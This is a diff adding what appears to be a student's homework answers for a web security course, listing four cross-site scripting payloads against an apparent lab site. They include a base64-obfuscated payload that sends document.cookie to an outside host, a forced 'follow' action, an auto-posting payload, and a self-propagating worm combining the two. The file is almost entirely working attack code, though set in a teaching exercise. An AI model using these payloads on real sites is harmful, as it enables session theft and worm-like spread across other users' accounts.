@@ -1,0 +1,36 @@
+Scott Kinder, Homework 2 Info 415
+1. Cookie Stealing XSS payload
+JQuery Input:
+$.ajax({
+	url: 'http://r7.io/e/kinder',
+	type: 'get',
+	data: { "s": document.cookie}
+})
+Payload:
+<img src="$sfs.$dfs" onerror="eval(atob('JC5hamF4KHsKCXVybDogJ2h0dHA6Ly9yNy5pby9lL2tpbmRlcicsCgl0eXBlOiAnZ2V0JywKCWRhdGE6IHsgInMiOiBkb2N1bWVudC5jb29raWV9Cn0p'))" />
+----
+
+2. "Follow Me" XSS Payload
+<img src="f$.$fs" onerror="follow('scottkattack')" />
+----
+
+3. Auto-Post XSS Payload
+Jquery Input:
+$.ajax({
+	url: 'https://snapcat.csuw.net/service.php?action=newpost',
+	type: 'post',
+	data: { 'desc': 'test', 'size': 0}
+})
+Payload:
+<img src="f$.$fs" onerror="eval(atob('JC5hamF4KHsKCXVybDogJ2h0dHBzOi8vc25hcGNhdC5jc3V3Lm5ldC9zZXJ2aWNlLnBocD9hY3Rpb249bmV3cG9zdCcsCgl0eXBlOiAncG9zdCcsCglkYXRhOiB7ICdkZXNjJzogJ3Rlc3QnLCAnc2l6ZSc6IDB9Cn0p'))" />
+----
+
+4. A single payload combining the "auto-post" and "follow me" payloads
+JQuery Input:
+$.ajax({
+	url: 'https://snapcat.csuw.net/service.php?action=newpost',
+	type: 'post',
+	data: { 'desc': '<img src="f$.$fs" onerror="follow(\'scottkattack\'); eval(atob(\'JC5hamF4KHsKCXVybDogJ2h0dHBzOi8vc25hcGNhdC5jc3V3Lm5ldC9zZXJ2aWNlLnBocD9hY3Rpb249bmV3cG9zdCcsCgl0eXBlOiAncG9zdCcsCglkYXRhOiB7ICdkZXNjJzogJzxpbWcgc3JjPSJmJC4kZnMiIG9uZXJyb3I9ImZvbGxvdyhcJ3Njb3R0a2F0dGFja1wnKSIgLz4nLCAnc2l6ZSc6IDB9Cn0p\'))" />', 'size': 0}
+})
+Payload:
+<img src="f$.$fs" onerror="follow('scottkattack'); eval(atob('JC5hamF4KHsKCXVybDogJ2h0dHBzOi8vc25hcGNhdC5jc3V3Lm5ldC9zZXJ2aWNlLnBocD9hY3Rpb249bmV3cG9zdCcsCgl0eXBlOiAncG9zdCcsCglkYXRhOiB7ICdkZXNjJzogJzxpbWcgc3JjPSJmJC4kZnMiIG9uZXJyb3I9ImZvbGxvdyhcJ3Njb3R0a2F0dGFja1wnKTsgZXZhbChhdG9iKFwnSkM1aGFtRjRLSHNLQ1hWeWJEb2dKMmgwZEhCek9pOHZjMjVoY0dOaGRDNWpjM1YzTG01bGRDOXpaWEoyYVdObExuQm9jRDloWTNScGIyNDlibVYzY0c5emRDY3NDZ2wwZVhCbE9pQW5jRzl6ZENjc0NnbGtZWFJoT2lCN0lDZGtaWE5qSnpvZ0p6eHBiV2NnYzNKalBTSm1KQzRrWm5NaUlHOXVaWEp5YjNJOUltWnZiR3h2ZHloY0ozTmpiM1IwYTJGMGRHRmphMXduS1NJZ0x6NG5MQ0FuYzJsNlpTYzZJREI5Q24wcFwnKSkiIC8+JywgJ3NpemUnOiAwfQp9KQ=='))" />
